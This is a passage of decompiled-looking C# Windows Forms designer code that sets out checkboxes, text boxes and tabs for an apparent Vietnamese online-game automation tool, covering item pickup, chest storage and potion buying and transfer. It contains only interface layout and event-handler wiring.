		this.baodskenhbang.CheckedChanged += new System.EventHandler(baodskenhbang_CheckedChanged);
		this.timequaylai.Location = new System.Drawing.Point(130, 4);
		this.timequaylai.Name = "timequaylai";
		this.timequaylai.Size = new System.Drawing.Size(22, 21);
		this.timequaylai.TabIndex = 339;
		this.timequaylai.TextChanged += new System.EventHandler(timequaylai_TextChanged);
		this.checkBoxQuayquai.AutoSize = true;
		this.checkBoxQuayquai.Enabled = false;
		this.checkBoxQuayquai.ForeColor = System.Drawing.Color.Black;
		this.checkBoxQuayquai.Location = new System.Drawing.Point(9, 102);
		this.checkBoxQuayquai.Name = "checkBoxQuayquai";
		this.checkBoxQuayquai.Size = new System.Drawing.Size(81, 19);
		this.checkBoxQuayquai.TabIndex = 268;
		this.checkBoxQuayquai.Text = "Quây quái";
		this.checkBoxQuayquai.UseVisualStyleBackColor = true;
		this.checkBoxQuayquai.Visible = false;
		this.checkBoxQuayquai.CheckedChanged += new System.EventHandler(checkBoxQuayquai_CheckedChanged);
		this.buttonThuocLag.ForeColor = System.Drawing.Color.Black;
		this.buttonThuocLag.Location = new System.Drawing.Point(202, 177);
		this.buttonThuocLag.Name = "buttonThuocLag";
		this.buttonThuocLag.Size = new System.Drawing.Size(60, 21);
		this.buttonThuocLag.TabIndex = 168;
		this.buttonThuocLag.Text = "Thuốc";
		this.buttonThuocLag.UseVisualStyleBackColor = true;
		this.buttonThuocLag.Click += new System.EventHandler(buttonThuocLag_Click);
		this.checkBoxAnThuocLag.AutoSize = true;
		this.checkBoxAnThuocLag.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxAnThuocLag.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxAnThuocLag.ForeColor = System.Drawing.Color.Black;
		this.checkBoxAnThuocLag.Location = new System.Drawing.Point(9, 177);
		this.checkBoxAnThuocLag.Name = "checkBoxAnThuocLag";
		this.checkBoxAnThuocLag.Size = new System.Drawing.Size(181, 17);
		this.checkBoxAnThuocLag.TabIndex = 165;
		this.checkBoxAnThuocLag.Text = "Ăn bỏ các loại thuốc lag khi train";
		this.checkBoxAnThuocLag.UseVisualStyleBackColor = false;
		this.checkBoxAnThuocLag.CheckedChanged += new System.EventHandler(checkBoxAnThuocLag_CheckedChanged);
		this.labelLocBando.BackColor = System.Drawing.SystemColors.Control;
		this.labelLocBando.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.labelLocBando.Cursor = System.Windows.Forms.Cursors.Hand;
		this.labelLocBando.ForeColor = System.Drawing.Color.DarkBlue;
		this.labelLocBando.Location = new System.Drawing.Point(9, 130);
		this.labelLocBando.Name = "labelLocBando";
		this.labelLocBando.Size = new System.Drawing.Size(147, 38);
		this.labelLocBando.TabIndex = 338;
		this.labelLocBando.Text = "lọc, bán";
		this.labelLocBando.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.labelLocBando.Click += new System.EventHandler(labelLocBando_Click);
		this.comboBoxDoSatcuuSat.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxDoSatcuuSat.DropDownWidth = 85;
		this.comboBoxDoSatcuuSat.ForeColor = System.Drawing.Color.Black;
		this.comboBoxDoSatcuuSat.FormattingEnabled = true;
		this.comboBoxDoSatcuuSat.Location = new System.Drawing.Point(59, 3);
		this.comboBoxDoSatcuuSat.Name = "comboBoxDoSatcuuSat";
		this.comboBoxDoSatcuuSat.Size = new System.Drawing.Size(64, 23);
		this.comboBoxDoSatcuuSat.TabIndex = 138;
		this.comboBoxDoSatcuuSat.SelectedIndexChanged += new System.EventHandler(comboBoxDoSatcuuSat_SelectedIndexChanged);
		this.label24.AutoSize = true;
		this.label24.Location = new System.Drawing.Point(2, 7);
		this.label24.Name = "label24";
		this.label24.Size = new System.Drawing.Size(56, 15);
		this.label24.TabIndex = 243;
		this.label24.Text = "Bị Đồ sát";
		this.textBoxPhamviNhat.Location = new System.Drawing.Point(103, 53);
		this.textBoxPhamviNhat.Name = "textBoxPhamviNhat";
		this.textBoxPhamviNhat.Size = new System.Drawing.Size(54, 21);
		this.textBoxPhamviNhat.TabIndex = 244;
		this.textBoxPhamviNhat.TextChanged += new System.EventHandler(textBoxPhamviNhat_TextChanged);
		this.checkBoxNhatdoDichuyenGan.AutoSize = true;
		this.checkBoxNhatdoDichuyenGan.ForeColor = System.Drawing.Color.Black;
		this.checkBoxNhatdoDichuyenGan.Location = new System.Drawing.Point(9, 55);
		this.checkBoxNhatdoDichuyenGan.Name = "checkBoxNhatdoDichuyenGan";
		this.checkBoxNhatdoDichuyenGan.Size = new System.Drawing.Size(97, 19);
		this.checkBoxNhatdoDichuyenGan.TabIndex = 236;
		this.checkBoxNhatdoDichuyenGan.Text = "Phạm vi nhặt";
		this.checkBoxNhatdoDichuyenGan.UseVisualStyleBackColor = true;
		this.checkBoxNhatdoDichuyenGan.CheckedChanged += new System.EventHandler(checkBoxNhatdoDichuyenGan_CheckedChanged);
		this.textBoxTimeXepdo.ForeColor = System.Drawing.Color.Black;
		this.textBoxTimeXepdo.Location = new System.Drawing.Point(102, 81);
		this.textBoxTimeXepdo.Name = "textBoxTimeXepdo";
		this.textBoxTimeXepdo.Size = new System.Drawing.Size(54, 21);
		this.textBoxTimeXepdo.TabIndex = 261;
		this.textBoxTimeXepdo.TextChanged += new System.EventHandler(textBoxTimeXepdo_TextChanged);
		this.checkBoxXepdo.AutoSize = true;
		this.checkBoxXepdo.ForeColor = System.Drawing.Color.Black;
		this.checkBoxXepdo.Location = new System.Drawing.Point(9, 80);
		this.checkBoxXepdo.Name = "checkBoxXepdo";
		this.checkBoxXepdo.Size = new System.Drawing.Size(93, 19);
		this.checkBoxXepdo.TabIndex = 260;
		this.checkBoxXepdo.Text = "Xếp đồ (ms)";
		this.checkBoxXepdo.UseVisualStyleBackColor = true;
		this.checkBoxXepdo.CheckedChanged += new System.EventHandler(checkBoxXepdo_CheckedChanged);
		this.label18.AutoSize = true;
		this.label18.ForeColor = System.Drawing.Color.DarkBlue;
		this.label18.Location = new System.Drawing.Point(167, 36);
		this.label18.Name = "label18";
		this.label18.Size = new System.Drawing.Size(105, 15);
		this.label18.TabIndex = 259;
		this.label18.Text = "Cất đồ vào rương :";
		this.buttonKhongcat.ForeColor = System.Drawing.Color.Black;
		this.buttonKhongcat.Location = new System.Drawing.Point(185, 126);
		this.buttonKhongcat.Name = "buttonKhongcat";
		this.buttonKhongcat.Size = new System.Drawing.Size(181, 38);
		this.buttonKhongcat.TabIndex = 258;
		this.buttonKhongcat.Text = "Loại trừ không cất";
		this.buttonKhongcat.UseVisualStyleBackColor = true;
		this.buttonKhongcat.Click += new System.EventHandler(buttonKhongcat_Click);
		this.checkBoxRuong0.AutoSize = true;
		this.checkBoxRuong0.Location = new System.Drawing.Point(202, 54);
		this.checkBoxRuong0.Name = "checkBoxRuong0";
		this.checkBoxRuong0.Size = new System.Drawing.Size(42, 19);
		this.checkBoxRuong0.TabIndex = 254;
		this.checkBoxRuong0.Text = "R0";
		this.checkBoxRuong0.UseVisualStyleBackColor = true;
		this.checkBoxRuong0.CheckedChanged += new System.EventHandler(checkBoxRuong0_CheckedChanged);
		this.checkBoxRuong2.AutoSize = true;
		this.checkBoxRuong2.Location = new System.Drawing.Point(293, 54);
		this.checkBoxRuong2.Name = "checkBoxRuong2";
		this.checkBoxRuong2.Size = new System.Drawing.Size(42, 19);
		this.checkBoxRuong2.TabIndex = 255;
		this.checkBoxRuong2.Text = "R2";
		this.checkBoxRuong2.UseVisualStyleBackColor = true;
		this.checkBoxRuong2.CheckedChanged += new System.EventHandler(checkBoxRuong2_CheckedChanged);
		this.checkBoxRuong3.AutoSize = true;
		this.checkBoxRuong3.Location = new System.Drawing.Point(339, 54);
		this.checkBoxRuong3.Name = "checkBoxRuong3";
		this.checkBoxRuong3.Size = new System.Drawing.Size(42, 19);
		this.checkBoxRuong3.TabIndex = 257;
		this.checkBoxRuong3.Text = "R3";
		this.checkBoxRuong3.UseVisualStyleBackColor = true;
		this.checkBoxRuong3.CheckedChanged += new System.EventHandler(checkBoxRuong3_CheckedChanged);
		this.checkBoxRuong1.AutoSize = true;
		this.checkBoxRuong1.Location = new System.Drawing.Point(248, 54);
		this.checkBoxRuong1.Name = "checkBoxRuong1";
		this.checkBoxRuong1.Size = new System.Drawing.Size(42, 19);
		this.checkBoxRuong1.TabIndex = 256;
		this.checkBoxRuong1.Text = "R1";
		this.checkBoxRuong1.UseVisualStyleBackColor = true;
		this.checkBoxRuong1.CheckedChanged += new System.EventHandler(checkBoxRuong1_CheckedChanged);
		this.label42.AutoSize = true;
		this.label42.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label42.Location = new System.Drawing.Point(158, 3);
		this.label42.Name = "label42";
		this.label42.Size = new System.Drawing.Size(226, 26);
		this.label42.TabIndex = 262;
		this.label42.Text = "- Nhặt đồ: chỉnh ở bảng 1 - điều khiển\r\n- Bán đồ, lọc đồ... chỉnh bên dưới";
		this.tabPage2.Controls.Add(this.tabControlHaucan);
		this.tabPage2.Location = new System.Drawing.Point(4, 30);
		this.tabPage2.Name = "tabPage2";
		this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage2.Size = new System.Drawing.Size(391, 290);
		this.tabPage2.TabIndex = 1;
		this.tabPage2.Text = "Hậu cần";
		this.tabPage2.UseVisualStyleBackColor = true;
		this.tabControlHaucan.Controls.Add(this.tabPageMuathuoc);
		this.tabControlHaucan.Controls.Add(this.tabPagePhuchoi);
		this.tabControlHaucan.Controls.Add(this.tabPageChieuthuc);
		this.tabControlHaucan.Controls.Add(this.tabPageBaoVat);
		this.tabControlHaucan.Controls.Add(this.tabPagetrangbi);
		this.tabControlHaucan.Location = new System.Drawing.Point(0, 0);
		this.tabControlHaucan.Margin = new System.Windows.Forms.Padding(0);
		this.tabControlHaucan.Name = "tabControlHaucan";
		this.tabControlHaucan.SelectedIndex = 0;
		this.tabControlHaucan.Size = new System.Drawing.Size(398, 294);
		this.tabControlHaucan.TabIndex = 0;
		this.tabPageMuathuoc.Controls.Add(this.buttonApDungMuaThuocAll);
		this.tabPageMuathuoc.Controls.Add(this.tabControl5);
		this.tabPageMuathuoc.Controls.Add(this.checkBoxMua1);
		this.tabPageMuathuoc.Controls.Add(this.buttonBungTuimau);
		this.tabPageMuathuoc.Controls.Add(this.textBoxSoluongThuocDimua);
		this.tabPageMuathuoc.Controls.Add(this.comboBoxMua2);
		this.tabPageMuathuoc.Controls.Add(this.buttonComboNhoithuoc);
		this.tabPageMuathuoc.Controls.Add(this.checkBoxMangtheotien);
		this.tabPageMuathuoc.Controls.Add(this.comboBoxMua1);
		this.tabPageMuathuoc.Controls.Add(this.textBoxSoluongTDP);
		this.tabPageMuathuoc.Controls.Add(this.textBoxPass);
		this.tabPageMuathuoc.Controls.Add(this.comboBoxMuaGiaiDoc);
		this.tabPageMuathuoc.Controls.Add(this.label12);
		this.tabPageMuathuoc.Controls.Add(this.checkBoxMuaTDP);
		this.tabPageMuathuoc.Controls.Add(this.buttonMuathuocBaovat);
		this.tabPageMuathuoc.Controls.Add(this.textBoxTienMangtheo);
		this.tabPageMuathuoc.Controls.Add(this.checkBoxMuaKTC);
		this.tabPageMuathuoc.Controls.Add(this.label4);
		this.tabPageMuathuoc.Controls.Add(this.buttonKyTranCac);
		this.tabPageMuathuoc.Controls.Add(this.checkBoxMuaGiaiDoc);
		this.tabPageMuathuoc.Controls.Add(this.checkBoxMua2);
		this.tabPageMuathuoc.Controls.Add(this.textBoxSoluong1);
		this.tabPageMuathuoc.Controls.Add(this.textBoxSoluongMuaGiaiDoc);
		this.tabPageMuathuoc.Controls.Add(this.textBoxSoluong2);
		this.tabPageMuathuoc.Location = new System.Drawing.Point(4, 24);
		this.tabPageMuathuoc.Name = "tabPageMuathuoc";
		this.tabPageMuathuoc.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageMuathuoc.Size = new System.Drawing.Size(390, 266);
		this.tabPageMuathuoc.TabIndex = 0;
		this.tabPageMuathuoc.Text = "Mua thuốc";
		this.tabPageMuathuoc.UseVisualStyleBackColor = true;
		this.buttonApDungMuaThuocAll.BackColor = System.Drawing.SystemColors.Control;
		this.buttonApDungMuaThuocAll.ForeColor = System.Drawing.Color.DarkRed;
		this.buttonApDungMuaThuocAll.Location = new System.Drawing.Point(3, 240);
		this.buttonApDungMuaThuocAll.Name = "buttonApDungMuaThuocAll";
		this.buttonApDungMuaThuocAll.Size = new System.Drawing.Size(136, 26);
		this.buttonApDungMuaThuocAll.TabIndex = 193;
		this.buttonApDungMuaThuocAll.Text = "Áp dụng tất cả";
		this.buttonApDungMuaThuocAll.UseVisualStyleBackColor = false;
		this.buttonApDungMuaThuocAll.Click += new System.EventHandler(buttonApDungMuaThuocAll_Click);
		this.tabControl5.Controls.Add(this.tabPage6);
		this.tabControl5.Controls.Add(this.tabPage11);
		this.tabControl5.Controls.Add(this.tabPage5);
		this.tabControl5.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.tabControl5.Location = new System.Drawing.Point(192, 3);
		this.tabControl5.Margin = new System.Windows.Forms.Padding(0);
		this.tabControl5.Name = "tabControl5";
		this.tabControl5.SelectedIndex = 0;
		this.tabControl5.Size = new System.Drawing.Size(199, 237);
		this.tabControl5.TabIndex = 377;
		this.tabPage6.Controls.Add(this.checkBoxMuaNgamy);
		this.tabPage6.Controls.Add(this.checkBoxMuaThon);
		this.tabPage6.Controls.Add(this.checkBoxVeThanhCt);
		this.tabPage6.Controls.Add(this.textBoxMuaMienphiMenu);
		this.tabPage6.Controls.Add(this.comboBoxTenThuocMienphi);
		this.tabPage6.Controls.Add(this.checkBoxTatmuaAll);
		this.tabPage6.Controls.Add(this.checkBoxRuongBH);
		this.tabPage6.Controls.Add(this.checkBoxHoasonMuathuoc);
		this.tabPage6.Controls.Add(this.checkBoxKhongNhapso);
		this.tabPage6.Controls.Add(this.linkLabelMuaMienphiMn);
		this.tabPage6.Controls.Add(this.checkBoxMuaMauFree);
		this.tabPage6.Location = new System.Drawing.Point(4, 22);
		this.tabPage6.Name = "tabPage6";
		this.tabPage6.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage6.Size = new System.Drawing.Size(191, 211);
		this.tabPage6.TabIndex = 0;
		this.tabPage6.Text = "Nâng cao";
		this.tabPage6.UseVisualStyleBackColor = true;
		this.checkBoxMuaNgamy.AutoSize = true;
		this.checkBoxMuaNgamy.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxMuaNgamy.ForeColor = System.Drawing.Color.Black;
		this.checkBoxMuaNgamy.Location = new System.Drawing.Point(3, 136);
		this.checkBoxMuaNgamy.Name = "checkBoxMuaNgamy";
		this.checkBoxMuaNgamy.Size = new System.Drawing.Size(109, 17);
		this.checkBoxMuaNgamy.TabIndex = 382;
		this.checkBoxMuaNgamy.Text = "Mua máu Nga my";
		this.checkBoxMuaNgamy.UseVisualStyleBackColor = false;
		this.checkBoxMuaNgamy.CheckedChanged += new System.EventHandler(checkBoxMuaNgamy_CheckedChanged);
		this.checkBoxMuaThon.AutoSize = true;
		this.checkBoxMuaThon.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxMuaThon.ForeColor = System.Drawing.Color.Black;
		this.checkBoxMuaThon.Location = new System.Drawing.Point(3, 171);
		this.checkBoxMuaThon.Name = "checkBoxMuaThon";
		this.checkBoxMuaThon.Size = new System.Drawing.Size(103, 17);
		this.checkBoxMuaThon.TabIndex = 381;
		this.checkBoxMuaThon.Text = "Mua máu ở thôn";
		this.checkBoxMuaThon.UseVisualStyleBackColor = false;
		this.checkBoxMuaThon.CheckedChanged += new System.EventHandler(checkBoxMuaThon_CheckedChanged);
		this.checkBoxVeThanhCt.AutoSize = true;
		this.checkBoxVeThanhCt.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxVeThanhCt.Location = new System.Drawing.Point(3, 117);
		this.checkBoxVeThanhCt.Name = "checkBoxVeThanhCt";
		this.checkBoxVeThanhCt.Size = new System.Drawing.Size(159, 17);
		this.checkBoxVeThanhCt.TabIndex = 382;
		this.checkBoxVeThanhCt.Text = "Chuyển thuốc trước khi mua";
		this.checkBoxVeThanhCt.UseVisualStyleBackColor = true;
		this.checkBoxVeThanhCt.CheckedChanged += new System.EventHandler(checkBoxVeThanhCt_CheckedChanged);
		this.textBoxMuaMienphiMenu.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxMuaMienphiMenu.ForeColor = System.Drawing.Color.DarkGreen;
		this.textBoxMuaMienphiMenu.Location = new System.Drawing.Point(96, 24);
		this.textBoxMuaMienphiMenu.Name = "textBoxMuaMienphiMenu";
		this.textBoxMuaMienphiMenu.Size = new System.Drawing.Size(60, 20);
		this.textBoxMuaMienphiMenu.TabIndex = 340;
		this.textBoxMuaMienphiMenu.TextChanged += new System.EventHandler(textBoxMuaMienphiMenu_TextChanged);
		this.comboBoxTenThuocMienphi.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxTenThuocMienphi.DropDownWidth = 180;
		this.comboBoxTenThuocMienphi.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTenThuocMienphi.FormattingEnabled = true;
		this.comboBoxTenThuocMienphi.Location = new System.Drawing.Point(96, 2);
		this.comboBoxTenThuocMienphi.Name = "comboBoxTenThuocMienphi";
		this.comboBoxTenThuocMienphi.Size = new System.Drawing.Size(60, 21);
		this.comboBoxTenThuocMienphi.TabIndex = 380;
		this.comboBoxTenThuocMienphi.SelectedIndexChanged += new System.EventHandler(comboBoxTenThuocMienphi_SelectedIndexChanged);
		this.comboBoxTenThuocMienphi.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxTenThuocMienphi_MouseDown);
		this.checkBoxTatmuaAll.AutoSize = true;
		this.checkBoxTatmuaAll.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTatmuaAll.ForeColor = System.Drawing.Color.Red;
		this.checkBoxTatmuaAll.Location = new System.Drawing.Point(3, 190);
		this.checkBoxTatmuaAll.Name = "checkBoxTatmuaAll";
		this.checkBoxTatmuaAll.Size = new System.Drawing.Size(119, 17);
		this.checkBoxTatmuaAll.TabIndex = 383;
		this.checkBoxTatmuaAll.Text = "Tạm tắt mua (all ac)";
		this.checkBoxTatmuaAll.UseVisualStyleBackColor = false;
		this.checkBoxTatmuaAll.CheckedChanged += new System.EventHandler(checkBoxTatmuaAll_CheckedChanged);
		this.checkBoxRuongBH.ForeColor = System.Drawing.Color.Red;
		this.checkBoxRuongBH.Location = new System.Drawing.Point(3, 84);
		this.checkBoxRuongBH.Name = "checkBoxRuongBH";
		this.checkBoxRuongBH.Size = new System.Drawing.Size(153, 38);
		this.checkBoxRuongBH.TabIndex = 376;
		this.checkBoxRuongBH.Text = "Chuyển [ mua1 + miễn phí] vào box bang hội";
		this.checkBoxRuongBH.UseVisualStyleBackColor = true;
		this.checkBoxRuongBH.CheckedChanged += new System.EventHandler(checkBoxRuongBH_CheckedChanged);
		this.checkBoxHoasonMuathuoc.AutoSize = true;
		this.checkBoxHoasonMuathuoc.ForeColor = System.Drawing.Color.Black;
		this.checkBoxHoasonMuathuoc.Location = new System.Drawing.Point(3, 153);
		this.checkBoxHoasonMuathuoc.Name = "checkBoxHoasonMuathuoc";
		this.checkBoxHoasonMuathuoc.Size = new System.Drawing.Size(140, 17);
		this.checkBoxHoasonMuathuoc.TabIndex = 380;
		this.checkBoxHoasonMuathuoc.Text = "Tự chạy mua ở Hoa sơn";
		this.checkBoxHoasonMuathuoc.UseVisualStyleBackColor = true;
		this.checkBoxHoasonMuathuoc.CheckedChanged += new System.EventHandler(checkBoxHoasonMuathuoc_CheckedChanged);
		this.checkBoxKhongNhapso.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxKhongNhapso.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxKhongNhapso.Location = new System.Drawing.Point(4, 47);
		this.checkBoxKhongNhapso.Name = "checkBoxKhongNhapso";
		this.checkBoxKhongNhapso.Size = new System.Drawing.Size(152, 39);
		this.checkBoxKhongNhapso.TabIndex = 343;
		this.checkBoxKhongNhapso.Text = "Không cần nhập số vào box mua miễn phí";
		this.checkBoxKhongNhapso.UseVisualStyleBackColor = false;
		this.checkBoxKhongNhapso.CheckedChanged += new System.EventHandler(checkBoxKhongNhapso_CheckedChanged);
		this.linkLabelMuaMienphiMn.AutoSize = true;
		this.linkLabelMuaMienphiMn.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.linkLabelMuaMienphiMn.Location = new System.Drawing.Point(7, 25);
		this.linkLabelMuaMienphiMn.Name = "linkLabelMuaMienphiMn";
		this.linkLabelMuaMienphiMn.Size = new System.Drawing.Size(87, 13);
		this.linkLabelMuaMienphiMn.TabIndex = 342;
		this.linkLabelMuaMienphiMn.TabStop = true;
		this.linkLabelMuaMienphiMn.Text = "click menu số =>";
		this.linkLabelMuaMienphiMn.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabelMuaMienphiMn_LinkClicked);
		this.checkBoxMuaMauFree.AutoSize = true;
		this.checkBoxMuaMauFree.ForeColor = System.Drawing.Color.Red;
		this.checkBoxMuaMauFree.Location = new System.Drawing.Point(3, 5);
		this.checkBoxMuaMauFree.Name = "checkBoxMuaMauFree";
		this.checkBoxMuaMauFree.Size = new System.Drawing.Size(91, 17);
		this.checkBoxMuaMauFree.TabIndex = 150;
		this.checkBoxMuaMauFree.Text = "Mua miễn phí";
		this.checkBoxMuaMauFree.UseVisualStyleBackColor = false;
		this.checkBoxMuaMauFree.CheckedChanged += new System.EventHandler(checkBoxMuaMauFree_CheckedChanged);
		this.tabPage11.Controls.Add(this.linkLabel1);
		this.tabPage11.Controls.Add(this.checkBoxChuyenChinhxac);
		this.tabPage11.Controls.Add(this.checkBoxBamPhimCong);
		this.tabPage11.Controls.Add(this.checkBoxTuChuyenThuoc);
		this.tabPage11.Controls.Add(this.buttonHDChuyenthuoc);
		this.tabPage11.Controls.Add(this.label8);
		this.tabPage11.Controls.Add(this.textBoxSoluongChuyenthuoc);
		this.tabPage11.Controls.Add(this.comboBoxChuyenThuoc);
		this.tabPage11.Controls.Add(this.label5);
		this.tabPage11.Controls.Add(this.textBoxChuyenThuocMin);
		this.tabPage11.Location = new System.Drawing.Point(4, 22);
		this.tabPage11.Name = "tabPage11";
		this.tabPage11.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage11.Size = new System.Drawing.Size(191, 211);
		this.tabPage11.TabIndex = 1;
		this.tabPage11.Text = "Chuyển thuốc";
		this.tabPage11.UseVisualStyleBackColor = true;
		this.linkLabel1.AutoSize = true;
		this.linkLabel1.Location = new System.Drawing.Point(4, 182);
		this.linkLabel1.Name = "linkLabel1";
		this.linkLabel1.Size = new System.Drawing.Size(112, 13);
		this.linkLabel1.TabIndex = 381;
		this.linkLabel1.TabStop = true;
		this.linkLabel1.Text = "=> giải thích nhiệt tình";
		this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked);
		this.checkBoxChuyenChinhxac.AutoSize = true;
		this.checkBoxChuyenChinhxac.ForeColor = System.Drawing.Color.DarkRed;
		this.checkBoxChuyenChinhxac.Location = new System.Drawing.Point(4, 162);
		this.checkBoxChuyenChinhxac.Name = "checkBoxChuyenChinhxac";
		this.checkBoxChuyenChinhxac.Size = new System.Drawing.Size(155, 17);
		this.checkBoxChuyenChinhxac.TabIndex = 380;
		this.checkBoxChuyenChinhxac.Text = "Chuyển chính xác theo tên";
		this.checkBoxChuyenChinhxac.UseVisualStyleBackColor = true;
		this.checkBoxChuyenChinhxac.CheckedChanged += new System.EventHandler(checkBoxChuyenChinhxac_CheckedChanged);
		this.checkBoxBamPhimCong.AutoSize = true;
		this.checkBoxBamPhimCong.Location = new System.Drawing.Point(3, 35);
		this.checkBoxBamPhimCong.Name = "checkBoxBamPhimCong";
		this.checkBoxBamPhimCong.Size = new System.Drawing.Size(121, 17);
		this.checkBoxBamPhimCong.TabIndex = 379;
		this.checkBoxBamPhimCong.Text = "Hoặc dùng phím + -";
		this.checkBoxBamPhimCong.UseVisualStyleBackColor = true;
		this.checkBoxBamPhimCong.CheckedChanged += new System.EventHandler(checkBoxBamPhimCong_CheckedChanged);
		this.checkBoxTuChuyenThuoc.ForeColor = System.Drawing.Color.Red;
		this.checkBoxTuChuyenThuoc.Location = new System.Drawing.Point(3, 0);
		this.checkBoxTuChuyenThuoc.Name = "checkBoxTuChuyenThuoc";
		this.checkBoxTuChuyenThuoc.Size = new System.Drawing.Size(155, 41);
		this.checkBoxTuChuyenThuoc.TabIndex = 348;
		this.checkBoxTuChuyenThuoc.Text = "Tự chuyển từ rương bang hội sang hành trang";
		this.checkBoxTuChuyenThuoc.UseVisualStyleBackColor = true;
		this.checkBoxTuChuyenThuoc.CheckedChanged += new System.EventHandler(checkBoxTuChuyenThuoc_CheckedChanged);
		this.buttonHDChuyenthuoc.BackColor = System.Drawing.SystemColors.Control;
		this.buttonHDChuyenthuoc.ForeColor = System.Drawing.Color.Black;
		this.buttonHDChuyenthuoc.Location = new System.Drawing.Point(3, 54);
		this.buttonHDChuyenthuoc.Name = "buttonHDChuyenthuoc";
		this.buttonHDChuyenthuoc.Size = new System.Drawing.Size(155, 21);
		this.buttonHDChuyenthuoc.TabIndex = 378;
		this.buttonHDChuyenthuoc.Text = "Điền tên thuốc cần chuyển :";
		this.buttonHDChuyenthuoc.UseVisualStyleBackColor = false;
		this.buttonHDChuyenthuoc.Click += new System.EventHandler(buttonHDChuyenthuoc_Click);
		this.label8.AutoSize = true;
		this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.label8.Location = new System.Drawing.Point(3, 114);
		this.label8.Name = "label8";
		this.label8.Size = new System.Drawing.Size(125, 13);
		this.label8.TabIndex = 353;
		this.label8.Text = "Khi số lượng thuốc còn <";
		this.label8.Click += new System.EventHandler(label8_Click);
		this.textBoxSoluongChuyenthuoc.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluongChuyenthuoc.Location = new System.Drawing.Point(129, 136);
		this.textBoxSoluongChuyenthuoc.Name = "textBoxSoluongChuyenthuoc";
		this.textBoxSoluongChuyenthuoc.Size = new System.Drawing.Size(30, 20);
		this.textBoxSoluongChuyenthuoc.TabIndex = 170;
		this.textBoxSoluongChuyenthuoc.TextChanged += new System.EventHandler(textBoxSoluongChuyenthuoc_TextChanged);
		this.comboBoxChuyenThuoc.BackColor = System.Drawing.SystemColors.Info;
		this.comboBoxChuyenThuoc.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxChuyenThuoc.DropDownWidth = 170;
		this.comboBoxChuyenThuoc.ForeColor = System.Drawing.Color.Black;
		this.comboBoxChuyenThuoc.FormattingEnabled = true;
		this.comboBoxChuyenThuoc.Location = new System.Drawing.Point(26, 81);
		this.comboBoxChuyenThuoc.Name = "comboBoxChuyenThuoc";
		this.comboBoxChuyenThuoc.Size = new System.Drawing.Size(160, 21);
		this.comboBoxChuyenThuoc.TabIndex = 208;
		this.comboBoxChuyenThuoc.SelectedIndexChanged += new System.EventHandler(comboBoxChuyenThuoc_SelectedIndexChanged);
		this.comboBoxChuyenThuoc.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxChuyenThuoc_MouseDown);
		this.label5.AutoSize = true;
		this.label5.Location = new System.Drawing.Point(63, 140);
		this.label5.Name = "label5";
		this.label5.Size = new System.Drawing.Size(125, 13);
		this.label5.TabIndex = 350;
		this.label5.Text = "Thì chuyển               bình";
		this.textBoxChuyenThuocMin.ForeColor = System.Drawing.Color.Black;
		this.textBoxChuyenThuocMin.Location = new System.Drawing.Point(129, 110);
		this.textBoxChuyenThuocMin.Name = "textBoxChuyenThuocMin";
		this.textBoxChuyenThuocMin.Size = new System.Drawing.Size(30, 20);
		this.textBoxChuyenThuocMin.TabIndex = 352;
		this.textBoxChuyenThuocMin.TextChanged += new System.EventHandler(textBoxChuyenThuocMin_TextChanged);
		this.tabPage5.Controls.Add(this.textBoxOso1);
		this.tabPage5.Controls.Add(this.textBoxOso2);
		this.tabPage5.Controls.Add(this.textBoxOso3);
		this.tabPage5.Controls.Add(this.label20);
		this.tabPage5.Controls.Add(this.richTextBox1);
		this.tabPage5.Controls.Add(this.label19);
		this.tabPage5.Controls.Add(this.label10);
		this.tabPage5.Controls.Add(this.checkBoxGanTenthuoc);
		this.tabPage5.Location = new System.Drawing.Point(4, 22);
		this.tabPage5.Name = "tabPage5";
		this.tabPage5.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage5.Size = new System.Drawing.Size(191, 211);
		this.tabPage5.TabIndex = 2;
		this.tabPage5.Text = "Gán ô tắt";
		this.tabPage5.UseVisualStyleBackColor = true;
		this.textBoxOso1.ForeColor = System.Drawing.Color.DarkGreen;
		this.textBoxOso1.Location = new System.Drawing.Point(138, 24);
		this.textBoxOso1.Name = "textBoxOso1";
		this.textBoxOso1.Size = new System.Drawing.Size(47, 20);
		this.textBoxOso1.TabIndex = 334;
		this.textBoxOso1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.textBoxOso1.TextChanged += new System.EventHandler(textBoxOso1_TextChanged);
		this.textBoxOso2.ForeColor = System.Drawing.Color.DarkGreen;
		this.textBoxOso2.Location = new System.Drawing.Point(138, 45);
		this.textBoxOso2.Name = "textBoxOso2";
		this.textBoxOso2.Size = new System.Drawing.Size(47, 20);
		this.textBoxOso2.TabIndex = 335;
		this.textBoxOso2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
